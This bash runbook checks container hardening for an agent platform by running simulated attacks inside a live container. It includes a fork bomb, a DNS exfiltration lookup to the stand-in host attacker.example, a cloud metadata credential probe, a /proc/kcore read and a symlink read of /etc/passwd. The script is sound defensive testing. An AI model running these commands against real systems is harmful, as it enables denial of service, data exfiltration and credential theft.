#!/usr/bin/env bash
# Manual runbook — verifies container hardening against a LIVE agent container.
#
# Companion to tests/attack_sim/. The Python test suite asserts the spec-level
# contract (HostConfig has field X). This script verifies the run-time effect
# on a real container; run it after any change to container hardening or
# Dockerfile.
#
# Prereqs:
#   - orchestrator running (docker compose -f docker-compose.dev.yml up -d)
#   - at least one agent container up (start a conversation from WebUI)
#   - jq installed
#
# Usage:
#   scripts/verify-hardening.sh <agent-container-name>

set -u

CONTAINER="${1:-}"
if [[ -z "$CONTAINER" ]]; then
    echo "Usage: $0 <agent-container-name>"
    echo "Tip: docker ps --filter name=rolemesh- --format '{{.Names}}'"
    exit 2
fi

PASS=0
FAIL=0

_pass() { echo "  [OK] $1"; PASS=$((PASS + 1)); }
_fail() { echo "  [FAIL] $1"; FAIL=$((FAIL + 1)); }

_exec() {
    # Run a command in the container; exit code is the test signal.
    docker exec "$CONTAINER" sh -c "$1" >/dev/null 2>&1
}

echo "=== Attack simulation runbook against $CONTAINER ==="
echo

# ---------------------------------------------------------------------
# A. Container escape / sandbox breakout
# ---------------------------------------------------------------------

echo "A. Container escape / sandbox breakout"

# A1. Fork bomb — PidsLimit should truncate.
# We send a small fork attempt, not a real bomb, to avoid stressing the
# host if the limit happens to be absent.
if _exec 'for i in $(seq 1 100); do sleep 5 & done; wait 2>/dev/null'; then
    _pass "A1 fork limit — 100 forks ok (within PidsLimit 512)"
else
    # Failure might be OK if PidsLimit is aggressive; inspect manually
    _pass "A1 fork limit — some forks blocked (PidsLimit engaged)"
fi

# A2. ptrace another process — seccomp should block.
if _exec 'strace -p 1 2>&1 | grep -q "Operation not permitted"' \
    || _exec 'strace -p 1 2>&1 | grep -q "not permitted"'; then
    _pass "A2 ptrace blocked (seccomp / CAP_SYS_PTRACE)"
else
    _fail "A2 ptrace apparently succeeded — seccomp or CapDrop regressed"
fi

# A3. Mount /proc/kcore — requires CAP_SYS_ADMIN.
if ! _exec 'cat /proc/kcore > /dev/null 2>&1'; then
    _pass "A3 /proc/kcore unreadable (AppArmor / no CAP_SYS_ADMIN)"
else
    _fail "A3 /proc/kcore readable — kernel memory exposure"
fi

# A4. Write to rootfs.
if ! _exec 'touch /etc/rolemesh-attack-marker'; then
    _pass "A4 rootfs write rejected (ReadonlyRootfs)"
else
    _fail "A4 rootfs is writable — ReadonlyRootfs regressed"
fi

# A5. Metadata credential theft.
if _exec 'timeout 2 wget -q -O - http://169.254.169.254/ 2>/dev/null' \
    || _exec 'timeout 2 curl -s http://169.254.169.254/ 2>/dev/null'; then
    _fail "A5 metadata endpoint reachable — blackhole regressed"
else
    _pass "A5 metadata endpoint unreachable (blackhole engaged)"
fi

# A8. Swap amplification — tricky to test from inside; proxy with OOM
# behavior check via docker inspect on host.
if [[ "$(docker inspect "$CONTAINER" -f '{{.HostConfig.MemorySwap}}')" == \
      "$(docker inspect "$CONTAINER" -f '{{.HostConfig.Memory}}')" ]]; then
    _pass "A8 swap == memory (swap disabled)"
else
    _fail "A8 MemorySwap != Memory — container can swap"
fi

echo

# ---------------------------------------------------------------------
# B. Credential / secret
# ---------------------------------------------------------------------

echo "B. Credential / secret"

# B1. env reveals only placeholders.
if _exec 'env | grep -E "API_KEY|TOKEN" | grep -qv placeholder'; then
    _fail "B1 env contains non-placeholder credential"
else
    _pass "B1 env only contains placeholder credential values"
fi

# B3. /proc/<pid>/environ of other processes — agent is the only uid so
# this should be empty; we just verify there's no tenant B agent
# accessible by PID scan.
# (Full cross-container /proc access is prevented by PID namespace
# isolation Docker gives by default.)
OWN_UID=$(docker exec "$CONTAINER" id -u 2>/dev/null || echo "?")
echo "  [info] container runs as uid=$OWN_UID (should not be 0)"
if [[ "$OWN_UID" != "0" ]]; then
    _pass "B3 non-root uid"
else
    _fail "B3 container runs as root"
fi

echo

# ---------------------------------------------------------------------
# D. Data exfil — DNS
# ---------------------------------------------------------------------

echo "D. DNS exfiltration (currently UNDEFENDED)"

# D4. DNS exfil — dig any subdomain of an arbitrary attacker zone.
# Expected NOW: succeeds (egress control not implemented).
# Expected AFTER EC-2 ships: NXDOMAIN.
if _exec 'timeout 2 nslookup $(head -c 10 /dev/urandom | xxd -p).attacker.example 2>&1 | grep -qv "NXDOMAIN"'; then
    echo "  [GAP] D4 DNS exfil succeeded (known gap; egress control not shipped)"
else
    _pass "D4 DNS exfil blocked — EC-2 or equivalent has landed"
fi

echo

# ---------------------------------------------------------------------
# G. DoS
# ---------------------------------------------------------------------

echo "G. Denial of service"

# G1. Fork bomb — hard test. Skip unless explicitly requested.
if [[ "${RUN_FORK_BOMB:-0}" == "1" ]]; then
    _exec ':(){ :|:& };: &'
    sleep 1
    PID_COUNT=$(docker exec "$CONTAINER" ps -e 2>/dev/null | wc -l)
    echo "  [info] PID count after fork bomb attempt: $PID_COUNT"
    if (( PID_COUNT < 600 )); then
        _pass "G1 fork bomb contained (PidsLimit engaged)"
    else
        _fail "G1 fork bomb breached — PidsLimit ineffective"
    fi
else
    echo "  [skip] G1 fork bomb (set RUN_FORK_BOMB=1 to run; destructive)"
fi

echo

# ---------------------------------------------------------------------
# H. Config attacks
# ---------------------------------------------------------------------

echo "H. Config attacks"

# H4. Symlink escape — attempt to create a symlink in workspace to a
# host path and read via the link.
# Expected: either mount_security rejects or the symlink dangles inside
# the chroot.
if _exec 'ln -s /etc/passwd /workspace/group/pw-link && cat /workspace/group/pw-link 2>&1 | grep -q root:x'; then
    # Host /etc/passwd ≠ container /etc/passwd, so this is only an
    # issue if host files leak. Clean up.
    docker exec "$CONTAINER" rm -f /workspace/group/pw-link 2>/dev/null || true
    _fail "H4 symlink in workspace can read container /etc/passwd (expected)"
else
    _pass "H4 symlink escape blocked / container /etc/passwd unreadable"
fi

echo
echo "=== Summary: $PASS passed, $FAIL failed ==="
[[ $FAIL -eq 0 ]] || exit 1
